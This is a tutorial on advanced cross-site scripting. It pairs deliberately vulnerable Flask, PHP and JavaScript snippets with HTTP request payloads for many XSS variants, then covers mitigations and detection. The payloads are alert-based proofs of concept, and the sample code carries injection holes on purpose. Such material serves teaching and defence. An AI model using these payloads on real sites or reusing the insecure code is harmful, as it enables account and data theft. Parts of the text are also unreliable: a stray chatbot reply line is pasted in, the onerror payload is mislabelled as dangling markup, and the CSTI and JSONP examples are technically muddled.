# Advanced XSS (Cross-Site Scripting)

## What you will learn in this course üßêüßê

- Understand the concept of Advanced XSS (Cross-Site Scripting)
- Learn how to exploit Advanced XSS vulnerabilities

Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts are executed in the context of the user's browser, leading to various harmful outcomes such as data theft, session hijacking, or redirection to malicious websites. Here‚Äôs a breakdown of how XSS works, along with examples of each technique:

### How an XSS Attack Works

An XSS attack begins with the attacker identifying a vulnerability in a web application where user input is reflected or stored and then rendered in the browser without proper sanitization. Once the vulnerability is found, the attacker injects a malicious script into the vulnerable input field, such as a comment box or URL parameter.

When the victim visits the compromised page, the browser treats the malicious script as legitimate content and executes it as part of the webpage. The script can perform a range of malicious actions, such as stealing cookies, logging keystrokes, or redirecting the user to a phishing site. This execution happens without the victim's knowledge, making the attack particularly dangerous.

As a result, the attacker gains unauthorized access to sensitive information, such as session cookies, or can manipulate the user's interactions with the web application. This access allows the attacker to impersonate the victim, steal data, or carry out further malicious activities, potentially compromising the security of the entire application.

### Types of XSS Attacks

#### Reflected XSS

Reflected XSS occurs when the injected script is immediately reflected back in the server‚Äôs response and executed by the victim's browser. This often involves tricking a user into clicking on a malicious link.

**Example Vulnerable Code**:

```python
# Example in a Flask application
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('query', '')
    return f"<h1>Search Results for: {query}</h1>"
```

**Exploitation Command**:

```http
GET /search?query=<script>alert('XSS')</script> HTTP/1.1
Host: vulnerable-website.com
```

When a user clicks the malicious link, the injected script executes, displaying an alert with the message 'XSS'.

#### Stored XSS (Persistent XSS)

Stored XSS occurs when the malicious script is permanently stored on the target server, such as in a database, and is executed whenever a user views the stored content.

**Example Vulnerable Code**:

```php
// Example in a PHP application
if(isset($_POST['comment'])) {
    $comment = $_POST['comment'];
    file_put_contents('comments.txt', $comment."\n", FILE_APPEND);
}
?>
<html>
<body>
    <?php echo file_get_contents('comments.txt'); ?>
</body>
</html>
```

**Exploitation Command**:

```http
POST /submit_comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert('Stored XSS')</script>
```

Whenever a user views the comments, the script executes, displaying an alert.

#### DOM-Based XSS

DOM-Based XSS occurs when the vulnerability exists in the client-side script, allowing the attacker to manipulate the DOM environment to execute the script.

**Example Vulnerable Code**:

```javascript
// Example in JavaScript
var query = document.location.search;
document.getElementById("result").innerHTML = "Search results for: " + query;
```

**Exploitation Command**:

```http
GET /search?query=<script>alert('DOM XSS')</script> HTTP/1.1
Host: vulnerable-website.com
```

The script is executed in the user's browser when the manipulated query parameter is reflected into the page.

### Exploitation Contexts

#### Raw HTML Injection

This involves injecting scripts directly into HTML content.

**Example Vulnerable Code**:

```html
<!-- Example in an HTML page -->
<div>User: <span id="username"></span></div>
<script>
    var user = document.location.hash.substring(1);
    document.getElementById('username').innerHTML = user;
</script>
```

**Exploitation Command**:

```http
GET /page#<script>alert('Raw HTML Injection')</script> HTTP/1.1
```

When the page loads, the script within the URL hash is injected and executed.

#### HTML Tag Attributes

Scripts can be injected by escaping out of HTML attributes and using event handlers.

**Example Vulnerable Code**:

```html
<!-- Example in an HTML form -->
<form action="/submit">
    <input name="username" value="<%= username %>">
    <input type="submit">
</form>
```

**Exploitation Command**:

```http
GET /submit?username="><script>alert('Attribute XSS')</script> HTTP/1.1
```

The script runs when the form is rendered, triggering the alert.

#### JavaScript Context

Scripts can be injected within `<script>` tags or within JavaScript code blocks.

**Example Vulnerable Code**:

```html
<!-- Example in an HTML script block -->
<script>
    var msg = "<?php echo $_GET['msg']; ?>";
    document.write(msg);
</script>
```

**Exploitation Command**:

```http
GET /page?msg=";alert('JS XSS');// HTTP/1.1
```

This injection closes the string and injects the malicious script.

### Techniques for Bypassing Protections

#### Encoding and Obfuscation

Encoding and obfuscation involve transforming malicious scripts into encoded formats, such as URL encoding, HTML entity encoding, or even Unicode encoding, to evade input filters or detection mechanisms. These techniques are particularly effective when the application employs basic filtering or sanitization methods that do not decode input before rendering it. By encoding malicious payloads, attackers can bypass these protections and achieve script execution in the user's browser.

**Example Vulnerable Code**:

```html
<!-- Example in a simple HTML page -->
<p>Message: <?php echo $_GET['msg']; ?></p>
```

**Exploitation Command**:

```http
GET /page?msg=%3Cscript%3Ealert%28'Encoded%20XSS'%29%3C%2Fscript%3E HTTP/1.1
```

Here, the script tag is URL-encoded, potentially allowing it to bypass input filters that do not decode the input before rendering.

#### Dangling Markup

Dangling markup refers to the exploitation of incomplete or improperly closed HTML tags to inject scripts into web pages. This technique leverages partially written or unbalanced HTML tags, which can confuse the browser's parser and lead to unintended script execution. By carefully crafting input that introduces broken HTML, attackers can inject malicious payloads that are executed by the browser during the rendering process.

**Example Vulnerable Code**:

```html
<!-- Example in a simple HTML page -->
<p>Message: <?php echo $_GET['msg']; ?></p>
```

**Exploitation Command**:

```http
GET /page?msg=<img src=x onerror=alert('Dangling Markup XSS')> HTTP/1.1
```

In this case, the script is executed via the `onerror` event when the browser attempts to load the invalid image source, resulting in the execution of the `alert` function.

### Advanced Techniques

#### Client-Side Template Injection

Client-side template injection (CSTI) occurs when attackers inject malicious payloads into template engines that are processed on the client side. Modern web applications often use client-side templates to dynamically render content based on user input or data from the server. If user input is not properly sanitized before being passed to the template, attackers can inject scripts that are executed within the context of the user's browser, potentially leading to data theft or other malicious actions.

**Example Vulnerable Code**:

```html
<!-- Example using a client-side template engine like Handlebars.js -->
<script id="entry-template" type="text/x-handlebars-template">
  <div>{{userInput}}</div>
</script>
```

**Exploitation Command**:

```http
GET /page?userInput={{alert('CSTI')}} HTTP/1.1
```

When this payload is injected and the template is rendered, the `alert` function is executed within the user's browser, demonstrating how CSTI can be exploited.

#### Bypassing Content Security Policy (CSP)

Content Security Policy (CSP) is a security feature that restricts the sources from which content can be loaded in a web page, thereby helping to mitigate XSS attacks. However, attackers can sometimes bypass CSP by exploiting whitelisted domains, using JSONP (JSON with Padding) endpoints, or finding other loopholes in the policy configuration. By carefully crafting requests that comply with the CSP while still executing malicious scripts, attackers can evade these protections.

**Example Vulnerable Code**:

```html
<!-- Example with a CSP allowing scripts from 'trusted.com' -->
<script src="https://trusted.com/script.js"></script>
```

**Exploitation Command**:

If the application loads JSONP from a trusted source, an attacker might be able to craft a URL that loads a malicious script from a whitelisted domain or leverages JSONP callbacks to execute arbitrary code.

#### Exploiting JSONP Endpoints

JSONP (JSON with Padding) is a technique used to overcome cross-domain issues by loading data via a script tag. However, if not implemented securely, JSONP endpoints can be exploited by attackers to execute arbitrary JavaScript in the context of the vulnerable application. By manipulating the callback parameter of a JSONP request, attackers can inject scripts that are executed by the browser, leading to XSS or other malicious activities.

**Example Vulnerable Code**:

```javascript
// Example loading JSONP data
<script src="https://trusted.com/api?callback=alert('JSONP XSS')"></script>
```

**Exploitation Command**:

By injecting a malicious callback parameter, such as `alert('JSONP XSS')`, the attacker can exploit the JSONP endpoint to execute arbitrary scripts in the user's browser.

#### Using Special Protocols

Special protocols like `javascript:` or `data:` can be used in attributes such as `href` or `src` to execute scripts directly when an element is interacted with. These protocols are typically used to specify the URL of a resource or to encode data, but they can also be exploited to run scripts within the browser. By injecting a URL that uses the `javascript:` protocol, for example, an attacker can trigger script execution when the user clicks on a link.

**Example Vulnerable Code**:

```html
<!-- Example in a link -->
<a href="<?php echo $_GET['url']; ?>">Click me</a>
```

**Exploitation Command**:

```http
GET /page?url=javascript:alert('Special Protocol XSS') HTTP/1.1
```

When the user clicks the link, the `javascript:` protocol triggers the execution of the `alert` function, demonstrating how special protocols can be used in XSS attacks.

Certainly! Here‚Äôs the updated "Mitigation Techniques" section in English with secure code examples:

## Mitigation Techniques

Effectively mitigating Advanced XSS vulnerabilities requires a multi-layered approach to ensure that user inputs are securely handled and that malicious scripts are not executed in the browser. Here are the recommended techniques:

1. **Output Encoding and Escaping**: Always encode and escape data before rendering it in the browser. This prevents special characters from being interpreted as executable code. For instance, use functions like `htmlspecialchars()` in PHP or `escape()` in Python Flask to prevent injections.

**PHP Example**:

```php
<?php
if(isset($_POST['comment'])) {
   $comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
   file_put_contents('comments.txt', $comment."\n", FILE_APPEND);
}
?>
<html>
<body>
   <?php echo nl2br(htmlspecialchars(file_get_contents('comments.txt'), ENT_QUOTES, 'UTF-8')); ?>
</body>
</html>
```

**Python Flask Example**:

```python
from flask import Flask, request, escape

app = Flask(__name__)

@app.route('/search')
def search():
   query = escape(request.args.get('query', ''))
   return f"<h1>Search Results for: {query}</h1>"
```

2. **Content Security Policy (CSP)**: Implement a Content Security Policy to restrict which sources are allowed to execute scripts. This significantly reduces the risk of XSS by only allowing scripts from trusted sources.

**CSP Header Example**:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; object-src 'none';
```

3. **Sanitization Libraries**: Use sanitization libraries to strip out potentially dangerous elements from user inputs before they are processed by the application.

**Example in JavaScript**:

```javascript
// Use a library like DOMPurify to sanitize user input
var userInput = '<script>alert("Unsafe")</script>';
var cleanInput = DOMPurify.sanitize(userInput);
document.getElementById('output').innerHTML = cleanInput;
```

4. **Avoid Direct Insertion**: Avoid direct insertion of user inputs into HTML or JavaScript contexts. Prefer using safe methods for incorporating user data into the page, such as using templating engines that automatically handle encoding.

**Example in Handlebars.js**:

```html
<script id="entry-template" type="text/x-handlebars-template">
 <div>{{userInput}}</div>
</script>
```

**Server-Side Handling**:

```javascript
var userInput = req.query.userInput;
var sanitizedInput = sanitize(userInput); // Ensure sanitization
res.render('template', { userInput: sanitizedInput });
```

By implementing these practices, you can significantly reduce the risk of XSS vulnerabilities in your web applications.

## Detection Techniques

Detecting Advanced XSS vulnerabilities requires a combination of proactive and reactive strategies. Proactive detection begins with rigorous security testing during the development process. Code reviews should focus on input validation and output encoding practices, ensuring that all user inputs are properly sanitized before being rendered in the browser. Penetration testing can also simulate real-world attacks to identify weaknesses in the application that might be exploited by XSS.

Automated vulnerability scanners are valuable tools for identifying common XSS vectors. These scanners can crawl your web application, testing various input fields and parameters for potential vulnerabilities. They are particularly useful for detecting reflected and stored XSS issues, but their effectiveness can be limited by the complexity of the application or obfuscation techniques used by attackers.

In addition to automated tools, monitoring application logs is crucial for detecting suspicious activities. Web application logs can reveal unusual patterns of user input or repeated attempts to inject scripts. For example, logs showing frequent use of special characters in query parameters or form submissions may indicate an attempted XSS attack. Integrating a Web Application Firewall (WAF) can also help in detecting and blocking XSS attempts in real time by analyzing HTTP requests and responses for malicious payloads.

Finally, regular audits of the application's security posture should be conducted to ensure that new features or updates do not introduce new vulnerabilities. By combining these detection techniques, organizations can maintain a strong defense against the evolving threat of XSS attacks.

## Resources

- [XSS Attack Advanced Techniques](https://cavalloj.medium.com/xss-attacks-advanced-techniques-to-bypass-data-sanitization-1c75496fce31)
- [10 Pratical Scenario for XSS](https://pentest-tools.com/blog/xss-attacks-practical-scenarios)
